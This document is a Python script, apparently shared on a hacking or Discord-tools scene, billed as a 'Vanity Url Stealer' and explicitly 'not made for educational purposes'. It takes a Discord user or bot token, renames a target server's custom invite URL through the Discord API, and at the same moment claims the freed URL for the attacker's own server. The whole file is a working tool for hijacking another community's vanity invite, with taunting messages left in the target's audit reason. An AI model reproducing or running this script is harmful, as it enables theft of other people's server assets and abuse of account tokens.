'''

~ THIS SHIT IS N̶O̶T̶ MADE FOR EDUCATIONAL PURPOSES
~ USE VPS FOR BEST RESULTS
~ Fastest Python Discord Vanity Url Stealer on Cord
~ By RisinPlayZ#1337



'''
import os
import sys
import asyncio 
from multiprocessing import Process
import time
#import httpx
import aiohttp
import random

def erase():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')
    
os.system("mode 175,30 & title [Vanity Sniper - RisinPlayZ#1337]") 
erase()
bot = input("Bot [True/False]: ")
erase()
tkn = input("Token: ")
erase()
breh = bot.lower()
if "t" in breh or "true" in breh:
    headers = {'Authorization': f'Bot {tkn}'}
else:
    headers = {"Authorization": tkn}
    
    
bruhness = input("Target Server ID: ")
ghey = input("Your Stealing Server ID: ")
idk = int(bruhness)
nvm = int(ghey)
erase()
code = input("Vanity Url Code : discord.gg/")
api = random.choice([8, 9])
ikr = random.randint(10, 99)

erase()
    
print(f"RisinPlayZ | Attempting to snipe discord.gg/{code}...\n\n")



async def change_vanity():
  playz = f"risinplayz-sniper-{ikr}"
  anime = {
                'code': playz,
                'reason': 'clapped by risinplayz'
  }
  async with aiohttp.ClientSession(headers=headers, connector=None) as handshake:
    async with handshake.patch(f"https://discord.com/api/v{api}/guilds/{idk}/vanity-url", json=anime) as sexxed:
        if sexxed.status in (200, 201, 204):
            print(f"Changed the vanity in target server, status: {sexxed.status}\n\nAttempting to snipe....")
            return
        print(f"Unable to change vanity in target server, status: {sexxed.status}\nTry again by enabling 2fa / enabling intents.")
        time.sleep(12)
        sys.exit()




async def steal_vanity():
  await asyncio.sleep(0.25)
  ahyeah = {
                'code': code,
                'reason': 'hoooooo lmao ded'
  }
  async with aiohttp.ClientSession(headers=headers, connector=None) as handshake:
    async with handshake.patch(f"https://discord.com/api/v{api}/guilds/{nvm}/vanity-url", json=ahyeah) as clown:
        erase()
        if clown.status in (200, 201, 204):
            print(f"\n\nVanity discord.gg/{code} sniped successfully, status: {clown.status}")
            time.sleep(12)
            return
            sys.exit()
        print(f"Unable to Snipe discord.gg/{code}, status: {clown.status}\nTry again by enabling 2fa / enabling intents / using a vps.")
        time.sleep(12)
        sys.exit()
 
 
 
 
 
 
        
async def risinplayzobv():  
	notThreading = loop.create_task(change_vanity())
	Concurrency = loop.create_task(steal_vanity())
	await asyncio.wait([notThreading, Concurrency])    


loop = asyncio.get_event_loop()
loop.run_until_complete(risinplayzobv())
loop.close()   
    
